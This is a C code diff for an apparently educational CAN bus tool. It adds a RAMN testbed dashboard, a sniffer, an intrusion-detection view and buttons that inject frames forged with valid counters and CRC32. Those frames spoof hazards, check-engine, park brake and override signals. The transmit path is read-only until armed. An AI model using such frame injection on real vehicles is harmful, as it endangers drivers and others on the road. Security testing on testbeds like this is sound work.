+    if (te && te->len == 8) {
+        snprintf(buf, sizeof(buf), "%02X %02X | %02X %02X | %02X %02X %02X %02X", te->data[0], te->data[1], te->data[2], te->data[3],
+                 te->data[4], te->data[5], te->data[6], te->data[7]);
+        txt(&FONT_M, buf, mx, 440, FG, A_C);
+        txt(&FONT_XS, "signal       counter     CRC32 (not a MAC!)", mx, 462, DIM, A_C);
+        snprintf(buf, sizeof(buf), "CRC ok %u   bad %u", (unsigned)te->crc_ok, (unsigned)te->crc_bad);
+        txt(&FONT_XS, buf, mx, 480, te->crc_ok ? GREEN : DIM, A_C);
+    }
+
+    // --- pedals (ECU C sliders)
+    bool aok, bok;
+    uint16_t acc = ramn_u16(R_CTL_ACCEL, t, &aok), brk = ramn_u16(R_CTL_BRAKE, t, &bok);
+    pedal_bar(940, 110, 110, 330, "ACCEL", R_CTL_ACCEL, acc, aok, GREEN);
+    pedal_bar(1110, 110, 110, 330, "BRAKE", R_CTL_BRAKE, brk, bok, RED);
+
+    if (ids_on && t - ids_last_hit < 3.0) {
+        gfx_fill(C, 0, 516, W, 40, ((int)(t * 4)) % 2 ? COL(120, 18, 14) : RED);
+        snprintf(buf, sizeof(buf), "!! IDS  -  %s", ids_last_msg);
+        txt(&FONT_B, buf, W / 2, 536, WHITE, A_C);
+    }
+    // --- attack buttons (forged with valid counter + CRC32)
+    const char *lab[5] = {"HAZARDS", "CHECK ENGINE", "HIGH BEAM", "PARK BRAKE", "OVERRIDE PIN"};
+    const char *hint[5] = {"[A] 0x1A7", "[B] 0x150", "[Y] 0x150", "[Up] 0x1D3", "[ZR] hold"};
+    uint32_t bits[5] = {B_A, B_B, B_Y, B_UP, B_ZR};
+    int types[5] = {HT_TAP, HT_TAP, HT_TAP, HT_TAP, HT_HOLD};
+    bool on[5] = {atk_active(ATK_R_HAZARD, t), atk_active(ATK_R_CHECK, t), atk_active(ATK_R_HIBEAM, t),
+                  atk_active(ATK_R_PBRAKE, t), atk_active(ATK_OMAX, t)};
+    int bw = 194;
+    for (int i = 0; i < 5; i++) {
+        Rect rr = {18 + i * (bw + 12), 568, bw, 74};
+        button(rr, lab[i], hint[i], on[i], tx_armed ? RED : LINE);
+        hit_add(rr, types[i], bits[i], 0);
+    }
+    gfx_rrect(C, 1048, 568, 214, 74, 12, tx_armed ? COL(70, 18, 14) : COL(16, 50, 32));
+    txt(&FONT_B, tx_armed ? "TX ARMED" : "READ-ONLY", 1155, 590, tx_armed ? RED : GREEN, A_C);
+    txt(&FONT_XS, tx_armed ? "adapter in normal mode (O)" : "adapter listen-only (L)", 1155, 616, DIM, A_C);
 }
 
 static void draw_sniffer(double t) {
@@ -959,7 +1356,7 @@ static void draw_sniffer(double t) {
     if (scroll_top < 0) scroll_top = 0;
     static const int hx[6] = {24, 120, 170, 606, 664, 748};
     static const char *hn[6] = {"ID", "DLC", "DATA", "Hz", "COUNT", "NAME"};
-    for (int i = 0; i < (src == SRC_SIM ? 6 : 5); i++) txt(&FONT_S, hn[i], hx[i], 68, DIM, A_TL);
+    for (int i = 0; i < ((src == SRC_SIM || ramn_mode) ? 6 : 5); i++) txt(&FONT_S, hn[i], hx[i], 68, DIM, A_TL);
     for (int k = 0; k < maxrows && scroll_top + k < nids; k++) {
         IdInfo *e = &ids[scroll_top + k];
         int y = top + k * rh;
@@ -981,6 +1378,7 @@ static void draw_sniffer(double t) {
             if (i < e->len) {
                 double age = t - e->changed[i];
                 uint32_t col = age < 0.3 ? RED : (age < 1.5 ? gfx_lerp(RED, FG, (float)((age - 0.3) / 1.2)) : (stale ? DIM : FG));
+                if (ramn_mode && e->len == 8 && e->crc_ok > 0 && i >= 2) col = i < 4 ? COL(60, 140, 180) : LINE;  // counter / CRC32
                 snprintf(buf, sizeof(buf), "%02X", e->data[i]);
                 txt(&FONT_B, buf, cell.x + 24, cell.y + 12, col, A_C);
                 hit_add(cell, HT_BYTE, e->id, (uint32_t)i);
@@ -995,6 +1393,10 @@ static void draw_sniffer(double t) {
         snprintf(buf, sizeof(buf), "%u", (unsigned)e->count);
         txt(&FONT_M, buf, 664, y + 2, DIM, A_TL);
         if (src == SRC_SIM) txt(&FONT_S, sim_name(e->id), 748, y + 4, DIM, A_TL);
+        else if (ramn_mode) txt(&FONT_XS, ramn_name(e->id), 748, y + 6, e->crc_ok ? DIM : LINE, A_TL);
+    }
+    if (ramn_mode && nids > 0) {
+        txt(&FONT_XS, "RAMN framing: bytes 0-1 signal (red = changing) | 2-3 freshness counter | 4-7 CRC32", 24, 656, COL(60, 140, 180), A_TL);
     }
     if (nids == 0) {
         txt(&FONT_MID, "Waiting for frames...", 450, 300, DIM, A_C);
@@ -1023,9 +1425,14 @@ static void draw_sniffer(double t) {
     snprintf(buf, sizeof(buf), "0x%03X", (unsigned)e->id);
     txt(&FONT_BIG, buf, 918, 76, FG, A_TL);
     if (src == SRC_SIM) txt(&FONT_M, sim_name(e->id), 1080, 94, DIM, A_TL);
+    else if (ramn_mode) txt(&FONT_XS, ramn_name(e->id), 1066, 100, DIM, A_TL);
     snprintf(buf, sizeof(buf), "%d Hz   %d bytes", rate_get(&e->rate, t), e->len);
     txt(&FONT_M, buf, 918, 132, DIM, A_TL);
-    txt(&FONT_S, "bit view (red = flipping)", 918, 166, DIM, A_TL);
+    if (src == SRC_USB && e->len == 8 && e->crc_ok > 0) {
+        snprintf(buf, sizeof(buf), "ctr %u  CRC32 %s", (unsigned)e->ctr_last, e->crc_bad ? "ok/bad" : "valid");
+        txt(&FONT_S, buf, 918, 166, GREEN, A_TL);
+    } else
+        txt(&FONT_S, "bit view (red = flipping)", 918, 166, DIM, A_TL);
     for (int bi = 0; bi < 8; bi++) {
         int yy = 194 + bi * 26;
         snprintf(buf, sizeof(buf), "b%d", bi);
@@ -1103,9 +1510,13 @@ static void draw_ids(double t) {
         else snprintf(buf, sizeof(buf), "%d/?", r);
         txt(&FONT_S, buf, bx + bw + 12, y + 2, anomal ? RED : DIM, A_TL);
     }
-    int ce = rate_get(&ctr_rate, t);
-    snprintf(buf, sizeof(buf), "0x1A0 counter errors: %d/s", ce);
-    txt(&FONT_M, buf, 680, 610, ce > 5 ? RED : DIM, A_TL);
+    if (src == SRC_SIM) {
+        int ce = rate_get(&ctr_rate, t);
+        snprintf(buf, sizeof(buf), "0x1A0 ctr err %d/s | SecOC %s | MAC fails %u", ce, secoc_on ? "ON" : "OFF", (unsigned)mac_fail_total);
+        txt(&FONT_S, buf, 680, 612, ce > 5 || rate_get(&mac_fail, t) ? RED : DIM, A_TL);
+    } else {
+        txt(&FONT_S, "Checks: rate baseline + RAMN counter + CRC32", 680, 612, DIM, A_TL);
+    }
 }
 
 static const char *nfc_proto_name(uint32_t p) {
@@ -1256,8 +1667,10 @@ static void draw_footer(void) {
     gfx_fill(C, 0, H - 34, W, 34, PANEL);
     const char *hint;
     if (attract_on) hint = "DEMO MODE - touch anything or press a button to take control";
+    else if (tab == TAB_CLUSTER && src == SRC_USB && ramn_mode)
+        hint = "A hazards | B check-engine | Y high beam | Up park brake | ZR override pin | + hold 2s arm TX | X IDS";
     else if (tab == TAB_CLUSTER)
-        hint = src == SRC_SIM ? "Stick gas/brake | D-pad blinkers | ZR spoof speed | ZL redline | A doors | B warnings | X IDS"
+        hint = src == SRC_SIM ? "Stick gas | ZR spoof | ZL redline | A doors | B warn | Up attack level | Down SecOC | X IDS"
                               : "Pin a signal in SNIFFER | ZR/ZL override it (TX armed) | + hold 2s arm TX | X IDS";
     else if (tab == TAB_SNIFF) hint = "Up/Down ID | Left/Right byte | A pin to gauge | B clear | Y fuzz | L/R tabs | - help";
     else if (tab == TAB_IDS) hint = "X IDS on/off | A re-learn baseline | B clear alerts | L/R tabs | - help";
@@ -1324,8 +1737,10 @@ static void switch_source(int s, double t) {
     have_sel = false;
     ids_reset(t);
     stop_attract();
+    ramn_mode = false;
     if (s == SRC_USB) {
         tx_armed = false;
+        plat_usb_set_tx(false);
         tab = TAB_SNIFF;
         toast(t, "USB-CAN connected - READ-ONLY. Move a knob, watch the red bytes, pin with A");
     } else {
@@ -1371,6 +1786,8 @@ bool app_frame(Canvas *c, const Input *in, double t) {
         else {
             tx_armed = !tx_armed;
             if (!tx_armed) atk_clear();
+            plat_usb_set_tx(tx_armed);
+            plat_rumble(0.6f, 150);
             toast(t, tx_armed ? "TX ARMED - you are transmitting on a real bus" : "TX disarmed - read-only");
         }
     }
@@ -1395,6 +1812,26 @@ bool app_frame(Canvas *c, const Input *in, double t) {
     atk_tick(t, dt);
     ids_eval(t);
     if (!have_sel && nids) { sel_id = ids[0].id; have_sel = true; }
+    if (src == SRC_USB && !ramn_mode) {
+        static const uint32_t sig[8] = {R_CTL_BRAKE, R_CTL_ACCEL, R_CTL_STEER, R_CTL_SHIFT, R_CMD_LIGHTS, R_CMD_TURN, R_CTL_KEY, R_CTL_LIGHTS};
+        int hits_n = 0;
+        for (int i = 0; i < 8; i++) {
+            IdInfo *e = find_id(sig[i]);
+            if (e && e->count > 5) hits_n++;
+        }
+        if (hits_n >= 3) {
+            ramn_mode = true;
+            plat_log("RAMN detected (%d signature IDs)", hits_n);
+            toast(t, "RAMN detected! CLUSTER is now a live RAMN dashboard (signals from Toyota's DBC)");
+            plat_rumble(0.5f, 120);
+        }
+    }
+    static bool first = true;
+    if (first) {
+        first = false;
+        plat_log("first frame ok");
+        if (plat_safe_mode()) toast(t, "SAFE MODE: USB, NFC and IR disabled (launched holding ZL)");
+    }
 
     // --- NFC / IR lifecycle
     bool want_nfc = tab == TAB_NFC, want_ir = tab == TAB_IR;
@@ -1419,7 +1856,10 @@ bool app_frame(Canvas *c, const Input *in, double t) {
     gfx_clear(c, BG);
     draw_header(t);
     switch (tab) {
-        case TAB_CLUSTER: draw_cluster(t); break;
+        case TAB_CLUSTER:
+            if (src == SRC_USB && ramn_mode) draw_ramn(t);
+            else draw_cluster(t);
+            break;
         case TAB_SNIFF: draw_sniffer(t); break;
         case TAB_IDS: draw_ids(t); break;
         case TAB_NFC: draw_nfc(t); break;
